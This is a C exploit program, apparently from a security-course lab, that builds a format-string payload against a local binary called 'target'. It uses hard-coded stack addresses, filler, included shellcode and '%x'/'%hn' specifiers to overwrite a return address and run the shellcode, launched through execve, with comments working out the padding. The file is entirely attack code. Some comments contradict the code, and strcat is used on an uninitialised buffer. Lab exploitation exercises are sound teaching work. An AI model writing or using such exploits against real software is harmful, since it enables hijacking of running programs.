#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "target"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;
  args[1] = (char*) malloc(80);

  if (args[1] == NULL) {
    fprintf(stderr, "Error in malloc.");
    return 1;
  }

  int i;

  //buf is 0xbffffc50
  //ret is 0xbffffde4 (buf + 404) -> fde4 e bfff
  //ret addr * 2 "junk" + shellcode = 57
  //the address we want to overwrite in ret is buf+12 (shellcode)
  // = fc5c
  //formula: pad = target(shellcode addr word) - %x needed to reach buf - 1 (so 0 for us) - what's already written = 
  //pad1 = 61547
  //pad2 = same formula = in this case simply high addr - low addr = bfff - f048 = neg number
  //workaround : 1bfff-fc5c = 50083
  char ret_location[] = "\xec\xfd\xff\xbf"; //addr of ret addr in stack
  char ret_location2[] = "\xee\xfd\xff\xbf";

  strcat(args[1], ret_location); //2- this will be read by %hn
  strcat(args[1], "JUNK"); // 3-"hook" for %x (second one)
  strcat(args[1], ret_location2);// 4-read by last %hm
  strcat(args[1], shellcode);
  strcat(args[1], "%64547x"); // 1-this x will read the value before the buf in stack
  strcat(args[1], "%hn");
  strcat(args[1], "%50083x");
  strcat(args[1], "%hn");
  strcat(args[1], "\0");
  //args[1] = "AAAA%08x%08x%08x%08x%08x";

  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  free(args[1]);

  return 0;
}
